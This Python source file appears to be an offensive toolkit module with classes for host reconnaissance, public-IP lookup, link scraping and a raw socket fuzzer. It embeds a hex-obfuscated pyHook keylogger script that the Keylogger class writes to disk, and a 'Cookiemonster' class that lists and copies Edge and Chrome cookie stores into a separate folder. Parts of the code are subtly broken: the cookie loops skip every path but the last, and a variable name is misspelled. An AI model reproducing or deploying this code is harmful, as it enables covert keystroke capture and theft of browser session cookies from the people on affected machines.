import os
import re
import requests
from socket import *
from tqdm import tqdm
from argparse import *
from platform import *
from shutil import copy
from bs4 import BeautifulSoup


class ArgParser(ArgumentParser):
    # Program Usage. Returns arguments being passed
    pass

    def add_option(self, option1, option2, descr=''):
        self.add_argument(option1, option2, help=descr)

    def parse(self):
        return self.parse_args()


class Seeker(object):
    # loops  files given path and matches a particular string.
    def __init__(self):
        self.count = []

    def search_file(self, filename, path):
        for path, directories, files in os.walk(path):
            for file in files:
                if filename.lower() in file.lower():
                    print(os.path.join(path, file))
                    self.count.append(file)
    def __len__(self):
        return len(self.count)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)


class System(object):
    # Attempts To Find System Hardware, Hostname and Operating System.
    def __init__(self):
        self.platform = platform()
        self.architecture = architecture()[0]
        self.hostname = node()
        self.processor = processor()

    def get(self):
        # Output The Result
        return self.platform, self.architecture, self.hostname, self.processor

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)


class Ip(object):
    # Fetches ip using http://checkip.dyndns.org
    def __init__(self):
        self.url = 'http://checkip.dyndns.org'

    def get(self):
        request = requests.get(self.url)
        ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)[0]
        return ip

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)


class Keylogger(object):
    # Generates a keylogger script
    def __init__(self):
        self.code = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d"
        self.code += "\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68"
        self.code += "\x6f\x6e\x63\x6f\x6d\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72"
        self.code += "\x74\x20\x6c\x6f\x67\x67\x69\x6e\x67\x0d\x0a\x0d\x0a\x69"
        self.code += "\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0d\x0a\x0d\x0a\x0d\x0a"
        self.code += "\x0d\x0a\x0d\x0a\x0d\x0a\x63\x6c\x61\x73\x73\x20\x4b\x65"
        self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x3a\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x64\x65\x66\x20\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"
        self.code += "\x28\x73\x65\x6c\x66\x29\x3a\x0d\x0a\x0d\x0a\x20\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x78\x74"
        self.code += "\x6c\x6f\x67\x20\x3d\x20\x6f\x73\x2e\x67\x65\x74\x63\x77"
        self.code += "\x64\x28\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20"
        self.code += "\x20\x73\x65\x6c\x66\x2e\x74\x65\x68\x68\x6f\x6f\x6b\x20"
        self.code += "\x3d\x20\x70\x79\x48\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b\x4d"
        self.code += "\x61\x6e\x61\x67\x65\x72\x28\x29\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x68"
        self.code += "\x68\x6f\x6f\x6b\x2e\x4b\x65\x79\x44\x6f\x77\x6e\x20\x3d"
        self.code += "\x20\x73\x65\x6c\x66\x2e\x67\x65\x74\x6b\x65\x79\x73\x0d"
        self.code += "\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c"
        self.code += "\x66\x2e\x74\x65\x68\x68\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b"
        self.code += "\x4b\x65\x79\x62\x6f\x61\x72\x64\x28\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x70\x79\x74\x68\x6f\x6e"
        self.code += "\x63\x6f\x6d\x2e\x50\x75\x6d\x70\x4d\x65\x73\x73\x61\x67"
        self.code += "\x65\x73\x28\x29\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x20\x20"
        self.code += "\x20\x20\x64\x65\x66\x20\x67\x65\x74\x6b\x65\x79\x73\x28"
        self.code += "\x73\x65\x6c\x66\x2c\x20\x6b\x65\x79\x29\x3a\x0d\x0a\x0d"
        self.code += "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6c\x6f\x67\x67\x69"
        self.code += "\x6e\x67\x2e\x62\x61\x73\x69\x63\x43\x6f\x6e\x66\x69\x67"
        self.code += "\x28\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d\x73\x65\x6c\x66"
        self.code += "\x2e\x74\x65\x78\x74\x6c\x6f\x67\x2c\x20\x6c\x65\x76\x65"
        self.code += "\x6c\x3d\x6c\x6f\x67\x67\x69\x6e\x67\x2e\x44\x45\x42\x55"
        self.code += "\x47\x2c\x20\x66\x6f\x72\x6d\x61\x74\x3d\x27\x25\x28\x6d"
        self.code += "\x65\x73\x73\x61\x67\x65\x29\x73\x27\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x63\x68\x72\x28\x6b\x65"
        self.code += "\x79\x2e\x41\x73\x63\x69\x69\x29\x2c\x0d\x0a\x0d\x0a\x20"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x6c\x6f\x67\x67\x69\x6e\x67"
        self.code += "\x2e\x6c\x6f\x67\x28\x31\x30\x2c\x20\x63\x68\x72\x28\x6b"
        self.code += "\x65\x79\x2e\x41\x73\x63\x69\x69\x29\x29\x0d\x0a\x0d\x0a"
        self.code += "\x20\x20\x20\x20\x20\x20\x20\x20\x70\x72\x69\x6e\x74\x20"
        self.code += "\x63\x68\x72\x28\x6b\x65\x79\x2e\x41\x73\x63\x69\x69\x29"
        self.code += "\x2c\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72"
        self.code += "\x65\x74\x75\x72\x6e\x20\x54\x72\x75\x65\x0d\x0a\x0d\x0a"
        self.code += "\x6b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x3d\x20\x4b\x65"
        self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x28\x29"

    def save(self, filename):
        with open(filename, 'w') as source:
            source.write(self.code)
            source.close()

    def __len__(self):
        return len(self.code)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)


class Scrape(object):
    # Fecthes a Specific page and finds links
    def __init__(self, page):
        self.page = requests.get('http://{}/'.format(page))
        self.content = self.page.content
        self.href_parser = BeautifulSoup(self.content, "html.parser")

    def scrape(self):
        for link in self.href_parser.findAll('a'):
            print(link.get('href'))

    def __len__(self):
        return len(self.href_parser.findAll('a'))

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)


class Cookiemonster(object):
    # Fetches locally stored cookies
    def __init__(self):
        self.files = []
        self.user = os.environ.get('USERNAME')
        self.cookie_paths = ['C:\\users\\{}\\AppData\\Local\\MicrosoftEdge\\Cookies'.format(self.user),
                                'C:\\users\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\MicrosoftEdge\\Cookies'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\INetCookies'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\User\\Default\\DOMStore'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\INetCookies'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\Cookies'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\DOMStore'.format(self.user),
                                'C:\\users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'.format(self.user),
                                'C:\\Users\\{}\\AppData\\Local\\Microsoft\\Windows\\INetCookies'.format(self.user)]

    def show(self):
        for paths in self.cookie_paths:
            continue
        for file in tqdm(os.listdir(paths)):
            try:
                print(os.path.join(paths, file))
            except Exception as e:
                pass

    def save(self, path, dirname):
        cookiejar = os.path.join(path, dirname)
        if not os.path.exists(cookiejar):
            os.mkdir(dirame)
        for paths in self.cookie_paths:
            continue
        for file in os.listdir(paths):
            try:
                copy(os.path.join(paths, file), cookiejar)
            except Exception as e:
                pass

    def __len__(self):
        for paths in self.cookie_paths:
            continue
        for file in os.listdir(paths):
            try:
                self.files.append(os.path.join(paths, file))
            except Exception as e:
                pass
        return len(files)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)


class NetFuzzer(object):
    # Fuzzer For Network Services
    def __init__(self, host, port):
        self.sock = socket()
        self.host = host
        self.port = port

    def fuzz(self, chars, length, timeout, recvbuffer):
        self.Buffer = chars * length
        self.sock.settimeout(timeout)
        self.sock.connect((self.host, self.port))
        self.sock.send(self.Buffer.encode())
        return self.sock.recv(recvbuffer).decode(),

    def __len__(self):
        return len(self.Buffer)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)
